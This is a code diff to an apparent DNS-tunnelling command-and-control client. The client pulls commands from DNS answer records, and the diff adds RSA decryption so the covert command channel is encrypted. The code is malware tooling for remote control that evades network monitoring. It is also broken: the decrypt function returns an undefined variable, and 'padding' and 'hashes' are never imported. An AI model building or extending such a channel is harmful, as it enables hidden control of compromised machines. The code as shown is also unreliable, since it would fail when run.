@@ -15,6 +15,18 @@ QUERY_DELAY = 3  # In seconds
 lastcommand = ''  # The previous command received
 
 
+# Read the private key in
+# Source: https://nitratine.net/blog/post/asymmetric-encryption-and-decryption-in-python/
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+with open("private_key.pem", "rb") as key_file:
+    private_key = serialization.load_pem_private_key(
+        key_file.read(),
+        password=None,
+        backend=default_backend()
+    )
+
+
 def read(packet):
     # Convert the raw packet to a scapy compatible string
     scapy_pkt = IP(packet.get_payload())
@@ -44,6 +56,7 @@ def getcommand(scapy_pkt):
 
     # Get command text
     command = str(scapy_pkt[DNS].an.rdata)[1:]
+    command = decrypt_command(command.decode('base64'))
     print('[!] Command: ' + str(command))
 
     if command != lastcommand:
@@ -53,6 +66,19 @@ def getcommand(scapy_pkt):
         lastcommand = command
     else:
         print('[!] Repeat command')
+
+
+def decrypt_command(encrypted):
+    original_command = private_key.decrypt(
+        encrypted,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA1(),
+            label=None
+        )
+    )
+
+    return originalcommand
 
 
 # Creates a random fake domain name
